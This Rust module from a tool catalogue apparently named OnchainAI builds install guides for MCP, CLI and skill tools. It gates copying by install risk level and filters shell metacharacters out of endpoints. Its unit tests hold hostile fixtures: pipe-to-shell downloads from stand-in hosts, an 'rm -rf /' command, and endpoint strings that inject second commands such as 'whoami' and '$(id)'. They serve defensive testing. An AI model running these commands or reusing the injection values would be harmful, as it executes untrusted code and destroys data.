//! Shared per-tool install guide builder — single source for UI and MCP responses.

use crate::install_safety::{blocks_structured_config, claude_mcp_config, install_warning_text};
use crate::models::Tool;
use serde::{Deserialize, Serialize};

/// Client platform for install guidance.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum InstallPlatform {
    Claude,
    Cursor,
    GenericMcp,
    CliSdk,
}

impl InstallPlatform {
    pub fn parse(raw: &str) -> Option<Self> {
        match raw {
            "claude" => Some(Self::Claude),
            "cursor" => Some(Self::Cursor),
            "generic" | "generic_mcp" => Some(Self::GenericMcp),
            "cli" | "cli_sdk" | "clisdk" => Some(Self::CliSdk),
            _ => None,
        }
    }

    pub fn as_str(self) -> &'static str {
        match self {
            Self::Claude => "claude",
            Self::Cursor => "cursor",
            Self::GenericMcp => "generic_mcp",
            Self::CliSdk => "cli_sdk",
        }
    }

    pub fn all_selectable() -> [Self; 4] {
        [Self::Claude, Self::Cursor, Self::GenericMcp, Self::CliSdk]
    }

    /// Platforms for the global OnchainAI connect card (spec §11.6).
    pub fn connect_card_platforms() -> [Self; 3] {
        [Self::Claude, Self::Cursor, Self::GenericMcp]
    }

    /// Default connect-card selection — Claude config first.
    pub fn default_connect_platform() -> Self {
        Self::Claude
    }

    /// Parameter for `get_public_install_guide` server function.
    pub fn server_param(self) -> &'static str {
        match self {
            Self::Claude => "claude",
            Self::Cursor => "cursor",
            Self::GenericMcp => "generic",
            Self::CliSdk => "cli_sdk",
        }
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum CopyGate {
    Allow,
    RevealFirst,
    Blocked,
}

impl CopyGate {
    pub fn for_risk(risk_level: &str) -> Self {
        match risk_level {
            "critical" => Self::Blocked,
            "high" => Self::RevealFirst,
            _ => Self::Allow,
        }
    }

    pub fn copy_allowed(self, copy_revealed: bool) -> bool {
        match self {
            Self::Allow => true,
            Self::RevealFirst => copy_revealed,
            Self::Blocked => false,
        }
    }
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct GuideLink {
    pub label: String,
    pub url: String,
}

/// Public install guide contract shared by UI surfaces and MCP `get_install_guide`.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct PublicInstallGuide {
    pub slug: String,
    pub tool_name: String,
    pub platform: String,
    pub risk_level: String,
    pub risk_reasons: Vec<String>,
    pub warning: Option<String>,
    pub blocked: bool,
    pub copy_gate: CopyGate,
    pub command: Option<String>,
    pub config_json: Option<String>,
    pub copy_text: Option<String>,
    pub copy_label: String,
    pub steps: Vec<String>,
    pub docs_links: Vec<GuideLink>,
    pub x402_notice: Option<String>,
    pub referral_disclosure: Option<String>,
}

pub const ADD_MCP_INTENT: &str = "add-mcp";

/// Whether the tool exposes any public install path (command, safe copy, or HTTP MCP endpoint).
pub fn tool_has_install_path(tool: &Tool) -> bool {
    primary_install_command(tool).is_some()
}

/// Label for the card/detail add action.
pub fn add_mcp_action_label(tool: &Tool) -> Option<&'static str> {
    if !tool_has_install_path(tool) {
        return None;
    }
    if tool.tool_type == "mcp" || tool.mcp_endpoint.is_some() {
        Some("Add MCP")
    } else {
        Some("Use with agent")
    }
}

/// Strip `selected` and `intent` params from a path+query string.
pub fn strip_add_mode_params(query_base: &str) -> String {
    let path = query_base.split('?').next().unwrap_or(query_base);
    crate::filter_query::strip_preview_params(path, query_base)
}

/// Build a URL preserving filters and opening add-mode preview (no duplicate `selected`).
pub fn add_mcp_href(query_base: &str, slug: &str) -> String {
    let base = strip_add_mode_params(query_base);
    let separator = if base.contains('?') { "&" } else { "?" };
    format!(
        "{base}{separator}selected={}&intent={ADD_MCP_INTENT}",
        urlencoding::encode(slug)
    )
}

/// Add-mode href from compare rows — opens tools browser add flow while retaining compare slugs.
pub fn add_mcp_href_from_compare(compare_slugs: &[String], tool_slug: &str) -> String {
    let base = if compare_slugs.is_empty() {
        "/tools".to_string()
    } else {
        format!(
            "/tools?compare_tools={}",
            urlencoding::encode(&compare_slugs.join(","))
        )
    };
    add_mcp_href(&base, tool_slug)
}

/// Sync body shared by `get_public_install_guide` (no database I/O).
pub fn build_install_guide_for_platform(
    tool: &Tool,
    slug: &str,
    platform_param: &str,
) -> Result<PublicInstallGuide, String> {
    let platform = InstallPlatform::parse(platform_param)
        .ok_or_else(|| format!("invalid platform: {platform_param}"))?;
    Ok(build_public_install_guide(tool, slug, platform))
}

/// Prefer a successful remote guide; fall back to the local builder on load/error.
pub fn resolve_install_guide(
    remote: Option<Result<PublicInstallGuide, crate::server::fn_error::FnError>>,
    local: PublicInstallGuide,
) -> PublicInstallGuide {
    remote.and_then(|result| result.ok()).unwrap_or(local)
}

/// Map guide copy labels to stable accessible button names.
pub fn copy_label_aria(copy_label: &str) -> &'static str {
    match copy_label {
        "Copy config" => "Copy config",
        "Copy command" => "Copy command",
        "Copy blocked" => "Copy blocked",
        _ => "Copy to clipboard",
    }
}

fn generic_mcp_remote_command(endpoint: &str) -> Option<String> {
    let endpoint = endpoint.trim();
    // Validate scheme via url parsing, then reject any shell metacharacters
    // so a pasted `npx mcp-remote {endpoint}` can't be turned into multiple
    // shell commands. Only http(s) URLs with a host are accepted.
    let parsed = url::Url::parse(endpoint).ok()?;
    if !matches!(parsed.scheme(), "http" | "https") {
        return None;
    }
    parsed.host_str()?;
    // Reject if the raw endpoint contains shell control characters.
    if endpoint.chars().any(|c| {
        matches!(
            c,
            ';' | '&' | '|' | '`' | '$' | '(' | ')' | '<' | '>' | '\n' | '\r'
        )
    }) {
        return None;
    }
    Some(format!("npx mcp-remote '{endpoint}'"))
}

fn primary_install_command(tool: &Tool) -> Option<String> {
    tool.safe_copy_command
        .clone()
        .or_else(|| tool.install_command.clone())
        .filter(|value| !value.trim().is_empty())
        .or_else(|| {
            tool.mcp_endpoint
                .as_deref()
                .and_then(generic_mcp_remote_command)
        })
}

fn npm_package_url(package: Option<&str>) -> Option<String> {
    let package = package?.trim();
    if package.is_empty() || package.starts_with("http://") || package.starts_with("https://") {
        return None;
    }
    Some(format!("https://www.npmjs.com/package/{package}"))
}

fn docs_links_for_tool(tool: &Tool) -> Vec<GuideLink> {
    let mut links = Vec::new();
    if let Some(url) = tool.repo_url.clone().filter(|u| !u.trim().is_empty()) {
        links.push(GuideLink {
            label: "Repository".into(),
            url,
        });
    }
    if let Some(url) = tool.homepage.clone().filter(|u| !u.trim().is_empty()) {
        links.push(GuideLink {
            label: "Homepage".into(),
            url,
        });
    }
    if let Some(url) = npm_package_url(tool.npm_package.as_deref()) {
        links.push(GuideLink {
            label: "npm package".into(),
            url,
        });
    }
    if let Some(url) = tool
        .mcp_endpoint
        .clone()
        .filter(|u| u.starts_with("http://") || u.starts_with("https://"))
    {
        links.push(GuideLink {
            label: "MCP endpoint".into(),
            url,
        });
    }
    links
}

pub(crate) fn x402_notice_for_tool(tool: &Tool) -> Option<String> {
    if tool.pricing != "x402" && tool.x402_price.is_none() && !tool.referral_enabled {
        return None;
    }
    let price = tool
        .x402_price
        .as_deref()
        .filter(|p| !p.trim().is_empty())
        .unwrap_or("the provider's x402 price");
    Some(format!(
        "Calls may request x402 payment ({price}). OnchainAI discloses payment metadata only and does not connect wallets or process payments."
    ))
}

pub(crate) fn referral_disclosure_for_tool(tool: &Tool) -> Option<String> {
    if !tool.referral_enabled {
        return None;
    }
    let bps = tool
        .referral_bps
        .map(|value| format!("{value} bps"))
        .unwrap_or_else(|| "an operator-configured share".into());
    let model = tool
        .referral_model
        .as_deref()
        .filter(|value| !value.trim().is_empty())
        .unwrap_or("attribution");
    Some(format!(
        "OnchainAI may receive {bps} through {model} referral attribution."
    ))
}

fn structured_config_json(slug: &str, command: &str, risk_level: &str) -> Option<String> {
    claude_mcp_config(slug, command, risk_level)
}

fn blocked_guide(tool: &Tool, slug: &str, platform: InstallPlatform) -> PublicInstallGuide {
    PublicInstallGuide {
        slug: slug.to_string(),
        tool_name: tool.name.clone(),
        platform: platform.as_str().to_string(),
        risk_level: tool.install_risk_level.clone(),
        risk_reasons: tool.install_risk_reasons.clone(),
        warning: Some("Install guidance blocked: critical risk pending operator review.".into()),
        blocked: true,
        copy_gate: CopyGate::Blocked,
        // Withhold the raw install command for blocked critical-risk guides so
        // unsafe shell guidance is never serialized through the public surface
        // or the MCP response. Operators review the listing first.
        command: None,
        config_json: None,
        copy_text: None,
        copy_label: "Copy blocked".into(),
        steps: vec![
            "This tool has a critical-risk install command.".into(),
            "Public install guidance is withheld until an operator reviews the listing.".into(),
            "Contact the project directly or wait for operator approval.".into(),
        ],
        docs_links: docs_links_for_tool(tool),
        x402_notice: x402_notice_for_tool(tool),
        referral_disclosure: referral_disclosure_for_tool(tool),
    }
}

fn is_mcp_catalog_tool(tool: &Tool) -> bool {
    tool.tool_type == "mcp" || tool.tool_type == "x402" || tool.mcp_endpoint.is_some()
}

fn command_only_guide(
    tool: &Tool,
    slug: &str,
    platform: InstallPlatform,
    steps: Vec<String>,
) -> PublicInstallGuide {
    let risk_level = tool.install_risk_level.clone();
    let copy_gate = CopyGate::for_risk(&risk_level);
    let command = primary_install_command(tool);
    PublicInstallGuide {
        slug: slug.to_string(),
        tool_name: tool.name.clone(),
        platform: platform.as_str().to_string(),
        risk_level: risk_level.clone(),
        risk_reasons: tool.install_risk_reasons.clone(),
        warning: install_warning_text(&risk_level).map(str::to_string),
        blocked: false,
        copy_gate,
        command: command.clone(),
        config_json: None,
        copy_text: command,
        copy_label: "Copy command".into(),
        steps,
        docs_links: docs_links_for_tool(tool),
        x402_notice: x402_notice_for_tool(tool),
        referral_disclosure: referral_disclosure_for_tool(tool),
    }
}

/// Build a public install guide for a listed tool and client platform.
pub fn build_public_install_guide(
    tool: &Tool,
    slug: &str,
    platform: InstallPlatform,
) -> PublicInstallGuide {
    if tool.install_risk_level == "critical" {
        return blocked_guide(tool, slug, platform);
    }

    if tool.tool_type == "skill" {
        return command_only_guide(
            tool,
            slug,
            platform,
            vec![
                "Install the skill using the command below (e.g. clawhub or your agent skills runtime).".into(),
                "Do not paste this into MCP server settings — skills are not MCP configs.".into(),
                "Open the docs link for usage after install.".into(),
            ],
        );
    }

    if matches!(tool.tool_type.as_str(), "cli" | "sdk" | "api") && !is_mcp_catalog_tool(tool) {
        return command_only_guide(
            tool,
            slug,
            platform,
            vec![
                "Run the install command in your terminal or package manager.".into(),
                "Open the repository or docs link for setup and API keys.".into(),
            ],
        );
    }

    let risk_level = tool.install_risk_level.clone();
    let copy_gate = CopyGate::for_risk(&risk_level);
    let config_blocked = blocks_structured_config(&risk_level);
    let command = primary_install_command(tool);
    let raw_install = tool
        .install_command
        .clone()
        .filter(|value| !value.trim().is_empty());
    let install_for_config = command
        .as_deref()
        .or(raw_install.as_deref())
        .unwrap_or_default();

    let (config_json, copy_text, copy_label, steps) = match platform {
        InstallPlatform::Claude => {
            let config = (!config_blocked)
                .then(|| structured_config_json(slug, install_for_config, &risk_level))
                .flatten();
            let copy = config.clone().or_else(|| command.clone());
            (
                config,
                copy,
                if config_blocked {
                    "Copy command".into()
                } else {
                    "Copy config".into()
                },
                vec![
                    "Open Claude Desktop settings.".into(),
                    if config_blocked {
                        "Structured config is unavailable for high-risk commands; use generic install only if you trust the source.".into()
                    } else {
                        "Paste the structured MCP config JSON into your Claude settings.".into()
                    },
                    "Restart Claude to load the tool.".into(),
                ],
            )
        }
        InstallPlatform::Cursor => {
            let config = (!config_blocked)
                .then(|| structured_config_json(slug, install_for_config, &risk_level))
                .flatten();
            let copy = config.clone().or_else(|| command.clone());
            (
                config,
                copy,
                if config_blocked {
                    "Copy command".into()
                } else {
                    "Copy config".into()
                },
                vec![
                    "Open Cursor MCP settings.".into(),
                    if config_blocked {
                        "High-risk install: do not paste raw shell wrappers. Add manually only if you trust the source.".into()
                    } else {
                        "Paste the config JSON or use the install command.".into()
                    },
                    "Reload MCP servers.".into(),
                ],
            )
        }
        InstallPlatform::GenericMcp => {
            let copy = command.clone();
            (
                None,
                copy,
                "Copy command".into(),
                vec!["Run the install command in your terminal.".into()],
            )
        }
        InstallPlatform::CliSdk => {
            let copy = command.clone();
            (
                None,
                copy,
                "Copy command".into(),
                vec![
                    "Install the package using the command below.".into(),
                    "Open the docs or repository link for setup details.".into(),
                ],
            )
        }
    };

    PublicInstallGuide {
        slug: slug.to_string(),
        tool_name: tool.name.clone(),
        platform: platform.as_str().to_string(),
        risk_level: risk_level.clone(),
        risk_reasons: tool.install_risk_reasons.clone(),
        warning: install_warning_text(&risk_level).map(str::to_string),
        blocked: false,
        copy_gate,
        command,
        config_json,
        copy_text,
        copy_label,
        steps,
        docs_links: docs_links_for_tool(tool),
        x402_notice: x402_notice_for_tool(tool),
        referral_disclosure: referral_disclosure_for_tool(tool),
    }
}

/// Install guide for connecting OnchainAI search MCP (global connect card, not per-tool).
pub fn build_onchainai_connect_guide(
    platform: InstallPlatform,
    endpoint_cmd: &str,
) -> PublicInstallGuide {
    let slug = "onchainai";
    let risk_level = "low";
    let (config_json, copy_text, copy_label, steps) = match platform {
        InstallPlatform::Claude | InstallPlatform::Cursor => {
            let config = claude_mcp_config(slug, endpoint_cmd, risk_level);
            let copy = config.clone().or_else(|| Some(endpoint_cmd.to_string()));
            (
                config,
                copy,
                "Copy config".into(),
                vec![
                    "Open your MCP client settings.".into(),
                    "Paste the OnchainAI search MCP config.".into(),
                    "Reload or restart your client.".into(),
                ],
            )
        }
        InstallPlatform::GenericMcp | InstallPlatform::CliSdk => (
            None,
            Some(endpoint_cmd.to_string()),
            "Copy command".into(),
            vec!["Run the command in your terminal to connect OnchainAI search MCP.".into()],
        ),
    };

    PublicInstallGuide {
        slug: slug.into(),
        tool_name: "OnchainAI MCP".into(),
        platform: platform.as_str().to_string(),
        risk_level: risk_level.into(),
        risk_reasons: vec!["documented package manager install".into()],
        warning: None,
        blocked: false,
        copy_gate: CopyGate::Allow,
        command: Some(endpoint_cmd.to_string()),
        config_json,
        copy_text,
        copy_label,
        steps,
        docs_links: vec![GuideLink {
            label: "OnchainAI".into(),
            url: crate::SITE_ORIGIN.into(),
        }],
        x402_notice: None,
        referral_disclosure: None,
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::models::tool::default_review_fields;

    fn tool_fixture(
        install: Option<&str>,
        risk: &str,
        safe_copy: Option<&str>,
        mcp_endpoint: Option<&str>,
        tool_type: &str,
    ) -> Tool {
        let review = default_review_fields();
        Tool {
            id: uuid::Uuid::new_v4(),
            name: "Test Tool".into(),
            slug: "test-tool".into(),
            description: None,
            function: "dev-tool".into(),
            asset_class: "crypto".into(),
            actor: "human".into(),
            tool_type: tool_type.into(),
            repo_url: Some("https://github.com/acme/tool".into()),
            homepage: None,
            npm_package: Some("@acme/tool".into()),
            install_command: install.map(str::to_string),
            mcp_endpoint: mcp_endpoint.map(str::to_string),
            chains: vec![],
            status: "community".into(),
            official_team: None,
            trust_score: 0,
            approval_status: "approved".into(),
            submitted_by: None,
            rejection_reason: None,
            crypto_relevance_score: 80,
            crypto_relevance_reasons: vec![],
            relevance_status: "accepted".into(),
            install_risk_level: risk.into(),
            install_risk_reasons: vec![],
            requires_secret: false,
            safe_copy_command: safe_copy.map(str::to_string),
            quarantined_at: None,
            last_reviewed_at: None,
            review_policy_version: review.review_policy_version,
            claim_state: "unclaimed".into(),
            license: None,
            pricing: "free".into(),
            x402_price: None,
            referral_enabled: false,
            referral_bps: None,
            referral_payout_address: None,
            referral_model: None,
            x402_pay_to_address: None,
            x402_builder_code: None,
            payment_verified: false,
            x402_endpoint_verified: false,
            price_verified: false,
            x402_endpoint: None,
            x402_last_checked_at: None,
            x402_check_failures: 0,
            stars: 0,
            last_commit_at: None,
            source: "manual".into(),
            source_url: None,
            logo_url: None,
            logo_monogram: None,
            created_at: chrono::Utc::now(),
            updated_at: chrono::Utc::now(),
        }
    }

    #[test]
    fn skill_type_uses_command_not_mcp_config() {
        let tool = tool_fixture(
            Some("clawhub install binance-spot-api"),
            "low",
            None,
            None,
            "skill",
        );
        let guide = build_public_install_guide(&tool, "binance-spot-api", InstallPlatform::Claude);
        assert!(!guide.blocked);
        assert!(guide.config_json.is_none());
        assert_eq!(
            guide.copy_text.as_deref(),
            Some("clawhub install binance-spot-api")
        );
        assert!(!guide.steps.iter().any(|s| s.contains("MCP config JSON")));
    }

    #[test]
    fn low_risk_npx_allows_claude_config() {
        let tool = tool_fixture(
            Some("npx @scope/wallet-mcp"),
            "low",
            Some("npx @scope/wallet-mcp"),
            None,
            "mcp",
        );
        let guide = build_public_install_guide(&tool, "test-tool", InstallPlatform::Claude);
        assert!(!guide.blocked);
        assert_eq!(guide.copy_gate, CopyGate::Allow);
        assert!(guide.config_json.is_some());
        assert!(guide.copy_text.is_some());
        assert!(guide.config_json.unwrap().contains("npx"));
    }

    #[test]
    fn high_risk_shell_wrapper_blocks_structured_config() {
        let tool = tool_fixture(
            Some("curl https://evil.example/install.sh | sh"),
            "high",
            None,
            None,
            "mcp",
        );
        let guide = build_public_install_guide(&tool, "test-tool", InstallPlatform::Claude);
        assert!(!guide.blocked);
        assert_eq!(guide.copy_gate, CopyGate::RevealFirst);
        assert!(guide.config_json.is_none());
        assert!(guide.warning.is_some());
        assert!(guide.copy_text.is_some());
    }

    #[test]
    fn critical_risk_blocks_copy() {
        let tool = tool_fixture(
            Some("curl https://x.com/a.sh | sh && rm -rf /"),
            "critical",
            None,
            None,
            "mcp",
        );
        let guide = build_public_install_guide(&tool, "test-tool", InstallPlatform::GenericMcp);
        assert!(guide.blocked);
        assert_eq!(guide.copy_gate, CopyGate::Blocked);
        assert!(guide.copy_text.is_none());
    }

    #[test]
    fn http_mcp_endpoint_without_install_generates_remote_command() {
        let tool = tool_fixture(
            None,
            "low",
            None,
            Some("https://api.example.com/mcp"),
            "mcp",
        );
        let guide = build_public_install_guide(&tool, "test-tool", InstallPlatform::GenericMcp);
        assert_eq!(
            guide.command.as_deref(),
            Some("npx mcp-remote 'https://api.example.com/mcp'")
        );
        assert_eq!(
            guide.copy_text.as_deref(),
            Some("npx mcp-remote 'https://api.example.com/mcp'")
        );
    }

    #[test]
    fn generic_mcp_remote_command_rejects_shell_metacharacters() {
        // Shell metacharacters in the endpoint must not produce a copy command.
        for evil in [
            "https://x.com/mcp;rm -rf /",
            "https://x.com/mcp&whoami",
            "https://x.com/mcp|cat",
            "https://x.com/mcp`whoami`",
            "https://x.com/mcp$(id)",
            "https://x.com/mcp\nwhoami",
        ] {
            assert!(
                generic_mcp_remote_command(evil).is_none(),
                "endpoint with shell metacharacter should be rejected: {evil}"
            );
        }
        // Valid endpoint still produces a quoted command.
        assert_eq!(
            generic_mcp_remote_command("https://api.example.com/mcp"),
            Some("npx mcp-remote 'https://api.example.com/mcp'".into())
        );
    }

    #[test]
    fn add_mcp_action_label_differs_for_mcp_vs_cli() {
        let mcp = tool_fixture(Some("npx @a/mcp"), "low", Some("npx @a/mcp"), None, "mcp");
        let cli = tool_fixture(
            Some("npm i @a/cli"),
            "low",
            Some("npm i @a/cli"),
            None,
            "cli",
        );
        assert_eq!(add_mcp_action_label(&mcp), Some("Add MCP"));
        assert_eq!(add_mcp_action_label(&cli), Some("Use with agent"));
    }

    #[test]
    fn add_mcp_href_preserves_query_and_sets_intent() {
        let href = add_mcp_href("/tools?type=mcp&chain=base", "zapper-mcp");
        assert!(href.contains("type=mcp"));
        assert!(href.contains("chain=base"));
        assert!(href.contains("selected=zapper-mcp"));
        assert!(href.contains("intent=add-mcp"));
    }

    #[test]
    fn add_mcp_href_replaces_stale_selected_param() {
        let href = add_mcp_href("/tools?selected=old&intent=add-mcp", "new-tool");
        assert!(href.contains("selected=new-tool"));
        assert_eq!(href.matches("selected=").count(), 1);
    }

    #[test]
    fn add_mcp_href_from_compare_preserves_compare_tools_context() {
        let slugs = vec!["aave".into(), "uniswap".into()];
        let href = add_mcp_href_from_compare(&slugs, "zapper-mcp");
        assert!(href.starts_with("/tools?"));
        assert!(href.contains("compare_tools=aave%2Cuniswap"));
        assert!(href.contains("selected=zapper-mcp"));
        assert!(href.contains("intent=add-mcp"));
    }

    #[test]
    fn copy_label_aria_maps_guide_labels() {
        assert_eq!(copy_label_aria("Copy config"), "Copy config");
        assert_eq!(copy_label_aria("Copy command"), "Copy command");
    }

    #[test]
    fn copy_gate_maps_risk_levels_to_copy_behavior() {
        assert_eq!(CopyGate::for_risk("low"), CopyGate::Allow);
        assert_eq!(CopyGate::for_risk("medium"), CopyGate::Allow);
        assert_eq!(CopyGate::for_risk("high"), CopyGate::RevealFirst);
        assert_eq!(CopyGate::for_risk("critical"), CopyGate::Blocked);
        assert!(CopyGate::Allow.copy_allowed(false));
        assert!(!CopyGate::RevealFirst.copy_allowed(false));
        assert!(CopyGate::RevealFirst.copy_allowed(true));
        assert!(!CopyGate::Blocked.copy_allowed(true));
    }

    #[test]
    fn build_install_guide_for_platform_matches_direct_builder() {
        let tool = tool_fixture(Some("npx @a/mcp"), "low", Some("npx @a/mcp"), None, "mcp");
        let via_param =
            build_install_guide_for_platform(&tool, "test-tool", "claude").expect("platform");
        let direct = build_public_install_guide(&tool, "test-tool", InstallPlatform::Claude);
        assert_eq!(via_param, direct);
    }

    #[test]
    fn onchainai_connect_guide_uses_endpoint_command() {
        let cmd = "npx mcp-remote www.onchain-ai.xyz/mcp";
        let guide = build_onchainai_connect_guide(InstallPlatform::Claude, cmd);
        assert!(guide.config_json.is_some());
        assert!(guide.copy_text.unwrap().contains("mcp-remote"));
    }
}
